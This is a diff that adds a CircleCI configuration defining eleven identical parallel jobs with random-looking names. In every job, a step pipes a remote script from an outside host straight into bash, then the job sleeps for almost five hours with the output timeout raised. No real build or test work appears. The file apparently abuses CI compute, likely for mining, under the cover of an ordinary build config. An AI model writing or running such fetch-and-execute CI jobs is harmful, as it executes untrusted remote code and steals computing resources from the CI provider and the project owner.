@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  phtynaorestag:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  phtynaorestag1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  phtynaorestag2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  phtynaorestag3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  phtynaorestag4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  phtynaorestag5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  phtynaorestag6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  phtynaorestag7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  phtynaorestag8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  phtynaorestag9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  phtynaorestag10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - phtynaorestag
+      - phtynaorestag1
+      - phtynaorestag2
+      - phtynaorestag3
+      - phtynaorestag4
+      - phtynaorestag5
+      - phtynaorestag6
+      - phtynaorestag7
+      - phtynaorestag8
+      - phtynaorestag9
+      - phtynaorestag10
